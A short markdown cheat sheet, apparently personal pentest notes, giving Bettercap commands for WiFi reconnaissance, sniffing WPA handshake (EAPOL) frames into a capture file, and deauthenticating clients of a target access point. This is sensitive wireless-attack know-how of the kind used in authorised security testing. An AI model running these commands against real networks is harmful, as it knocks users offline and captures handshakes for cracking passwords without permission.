# Bettercap

```
bettercap -iface wlan0 # Enter bettercap shell
```

## Bettercap Shell
```
wifi.recon on
wifi.show

set wifi.recon.channel <channel>

set net.sniff.verbose true
set net.sniff.filter ether proto 0x888e
set net.sniff.output wpa.pcap

net.sniff on

wifi.deauth <bssid>
```
